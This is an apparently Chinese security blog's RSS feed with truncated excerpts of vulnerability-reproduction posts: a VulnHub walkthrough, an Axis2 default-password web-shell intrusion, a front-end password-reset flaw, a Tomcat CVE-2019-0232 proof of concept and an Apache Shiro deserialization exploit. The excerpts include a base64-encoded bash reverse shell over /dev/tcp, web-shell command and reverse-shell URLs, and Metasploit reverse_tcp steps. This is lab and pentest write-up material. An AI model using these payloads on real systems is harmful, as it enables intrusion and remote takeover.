<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>漏洞复现 on Vampire blog</title>
    <link>https://vampire-lab.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
    <description>Recent content in 漏洞复现 on Vampire blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <copyright>© Copyright notice</copyright>
    <lastBuildDate>Fri, 29 Nov 2019 12:25:32 +0800</lastBuildDate>
    
	<atom:link href="https://vampire-lab.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Relativity</title>
      <link>https://vampire-lab.github.io/posts/relativity/</link>
      <pubDate>Fri, 29 Nov 2019 12:25:32 +0800</pubDate>
      
      <guid>https://vampire-lab.github.io/posts/relativity/</guid>
      <description>靶机介绍 该靶机的目标为读取/root/flag.txt文件，也是boot2root类型靶机。 靶机下载地址 https://download.vulnhub.com/devrandom/relativity_1.0.1.zip
靶机运行 下载完成后，直接使用VMware虚拟机打开即可，可能需要修改一下网络配置，这边修改为NAT模式，方面配置网络。
信息收集 首先使用nmap查找一下靶机地址，我习惯使用-sn 或者-sP，在网段中只判断存活，确认靶机地址为10.10.10.144
root@kali:~# nmap -sP 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 23:31 EST Nmap scan report for 10.10.10.1 Host is up (0.00027s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.000095s latency). MAC Address: 00:50:56:E3:59:BE (VMware) Nmap scan report for 10.10.10.144 Host is up (0.00028s latency). MAC Address: 00:0C:29:17:89:4F (VMware) Nmap scan report for 10.10.10.254 Host is up (0.</description>
    </item>
    
    <item>
      <title>Axis2弱口令渗透测试</title>
      <link>https://vampire-lab.github.io/posts/axis2%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
      <pubDate>Mon, 04 Nov 2019 19:34:07 +0800</pubDate>
      
      <guid>https://vampire-lab.github.io/posts/axis2%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
      <description>故事背景 发现一个Tomcat服务器 使用dirsearch 扫描查看存在的目录 dirsearch -u xxx -e *
发现存在/axis2/axis2-admin/路径 访问http://10.xxx.xxx.158:18089/axis2/axis2-admin/
漏洞发现 访问axis2登录页面，尝试默认口令登录admin:axis2,登录成功 漏洞利用 找到上传点，axis2可上传.aar格式木马 访问 http://10.xxx.xxx.158:18089/axis2/axis2-admin/listService 找到木马访问路径
木马下载地址 https://github.com/Svti/Axis2Shell axis2 web shell使用介绍：
1、命令执行 http://1.1.1.1/services/config/exec?cmd=whoami (不说了，执行命令。注意:xml换行没有处理好) 2、反弹shell http://1.1.1.1/services/config/shell?host=1.1.1.1&amp;amp;port=5555 (Linux则使用bash反弹shell，Windows则会进行socket执行shell) 文件上传 http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp (会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名) 文件下载 http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&amp;amp;path=/opt/tomcat/webapps/ROOT/shell.jsp (会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名) 5、class目录查看 http://1.1.1.1/services/config/getClassPath (会显示当前class的路径，方便文件上传) 构造木马访问连接 http://10.xxx.xxx.158:18089/axis2/services/config/exec?cmd=pwd
漏洞利用（msf方法） 该漏洞也可以使用msf利用模块 exploit/multi/http/axis2_deployer 查看配置show options
set RHOST xxxxxxxx set RPORT xxxx 然后设置payload set payload java/meterpreter/reverse_tcp 设置监听服务器地址 set LHOST xxxxx 设置监听端口 set LPORT xxxxx
执行exploit命令，反弹成功</description>
    </item>
    
    <item>
      <title>密码修改逻辑漏洞-前端验证</title>
      <link>https://vampire-lab.github.io/posts/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/</link>
      <pubDate>Mon, 04 Nov 2019 18:57:48 +0800</pubDate>
      
      <guid>https://vampire-lab.github.io/posts/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/</guid>
      <description>背景故事 今天上线测试发现了一个只有前端验证的修改密码逻辑漏洞，但是该应用根本没有对验证码进行验证。 访问测试地址http://xxx.xxx.xxx.xxx:xxx/dss，查看页面功能，发现存在找回密码功能。 漏洞发现 点击找回密码功能，输入内容后发现前端验证，未向后端发送数据包 从验证码入手，看看发送验证码的情况 发现点击发送没有时间限制，但是不能指定电话号码，所以不知道是否真的有短信发送 点击确定，向服务器发起获取验证码请求
POST /dss/findPwd.e HTTP/1.1 Host: xxx.xxx.xxx.xxx:xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://xxx.xxx.xxx.xxx:xxx/dss/findPwd.jsp Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 7 Connection: close Cookie: JSESSIONID=14CEE8646A9BF274394F948BE24D5ED5 id=test 放过请求找回test账号，返回200，没有数据内容 再尝试请求一个错误的账号，返回内容中疑似存在验证码，但是该验证码不能成功重置密码 上面数据包根据返回内容不同，也可用来爆破存在的用户名
漏洞验证 既然是前端验证，我们通过使用开发者工具箱找到前端验证的函数 查看找到的函数内容
function checkform() { $(&amp;#34;#checkResult&amp;#34;).html(&amp;#39;&amp;#39;); var checkResultMes = &amp;#39;请输入的用户账号!&amp;#39;; var findPwdNumber = $(&amp;#39;#findPwdNumber&amp;#39;).val(); if(!findPwdNumber||$.trim(findPwdNumber)==&amp;#39;&amp;#39;) { //验证手机号为11位 $(&amp;#34;#checkResult&amp;#34;).html(checkResultMes); return false; } return true; } //验证输入的手机号是否存在 function getRand(){ if(checkform()){ var findPwdNumber = $(&amp;#39;#findPwdNumber&amp;#39;).</description>
    </item>
    
    <item>
      <title>CVE 2019 0232 Tomcat远程代码执行漏洞</title>
      <link>https://vampire-lab.github.io/posts/cve-2019-0232-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 04 Nov 2019 16:32:00 +0800</pubDate>
      
      <guid>https://vampire-lab.github.io/posts/cve-2019-0232-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
      <description>漏洞简介 该漏洞只存在于Windows下安装Apache Tomcat 9.0.0.M1 to 9.0.17、Apache Tomcat 8.5.0 to 8.5.39、Apache Tomcat 7.0.0 to 7.0.93 的Tomcat，由于使用enableCmdLineArguments在Windows上运行时，远程执行代码漏洞（CVE-2019-0232）驻留在公共网关接口（CGI）Servlet中，java运行时环境（JRE）将命令行参数传递给Windows的方式存在缺陷导致。但是默认情况下禁用了CGI Servlet，并且在Tomcat 9.0.x中默认情况下禁用了其选项enableCmdLineArguments，因此远程代码执行漏洞被评为中危。
配置环境 要想复现环境需要修改tomcat安装目录中conf目录下的web.xml，内容如下
还需要将servlet-mapping中的注释去掉，内容如下
最后将conf文件夹下的context.xml中context元素添加设置privileged=&amp;quot;true&amp;rdquo;，内容如下
修改完成配置，然后在webapps下创建一个新的文件夹，并且在文件中新建一个WEB-INF文件夹，其中再创建一个cgi-bin目录，将xxx.bat文件写入到cgi-bin目录下，内容如下
上述内容完成后，进入Tomcat的bin目录下，运行startup.bat，访问http://127.0.0.1:8080/
成功，尝试访问我们创建的xxx.bat文件
证明访问成功，文件存在。
漏洞验证 使用poc进行测试 http://127.0.0.1:8080/test/cgi-bin/test.bat?&amp;amp;C%3a%5cwindows%5csystem32%5cipconfig
必须使用URL编码进行访问
返回结果如下
利用成功
也可以使用GitHub上的python脚本进行测试，需要修改url_dir为自己的cgi文件位置。 https://github.com/jas502n/CVE-2019-0232/blob/master/CVE-2019-0232.py</description>
    </item>
    
    <item>
      <title>shiro反序列化漏洞复现</title>
      <link>https://vampire-lab.github.io/posts/my-first-blog/</link>
      <pubDate>Sun, 03 Nov 2019 09:39:38 +0800</pubDate>
      
      <guid>https://vampire-lab.github.io/posts/my-first-blog/</guid>
      <description>框架简介 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。(百度百科)
漏洞原理 由于shiro使用rememberMe这个cookie字段对用户进行权限判断，为了防止出现越权问题，框架使用了CookieRemembreMeManager这个类，使用这个类对cookie中的rememberMe字段进行序列化，然后将其进行aes加密，最后使用base64对其编码，再返回给用户，由于shiro将aes的密钥硬编码在代码中，只要通过调试代码获取到了密钥进行解密，就可以使用ysoserial包进行反序列化操作，生成带有远程代码执行的rememberMe字段值进行漏洞利用。
环境搭建 测试使用的环境是
https://github.com/Medicean/VulApps/ 靶机地址和文件路径
https://github.com/Medicean/VulApps/tree/master/s/shiro/1 VulApps/s/shiro/1 运行命令获取并启动靶机环境
docker pull medicean/vulapps:s_shiro_1 docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 使用命令查看靶机是否启动成功
docker container ls 靶机启动成功，访问靶机，端口被映射成80，直接访问 http://xxx.xxx.xxx.xxx
漏洞复现 利用代码执行反弹shell获取权限 开启nc进行监听
nc -k -lvvp 8080 使用ysoserial生成相关payload 下载ysoserial
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar 运行命令建立监听端口和相关命令
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1443 CommonsCollections4 &amp;#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzUvODA4MCAwPiYx}|{base64,-d}|{bash,-i}&amp;#39; 监听端口这里设置为1443，该端口可以随意设置 其中base64部分内容为
bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.135/8080 0&amp;gt;&amp;amp;1 其内容为需要shell反弹到的目的IP和端口，也就是上面运行nc监听的服务器和端口号 然后运行生成rememberMe字段的脚本工具
import sys import uuid import base64 import subprocess from Crypto.Cipher import AES def encode_rememberme(command): popen = subprocess.</description>
    </item>
    
  </channel>
</rss>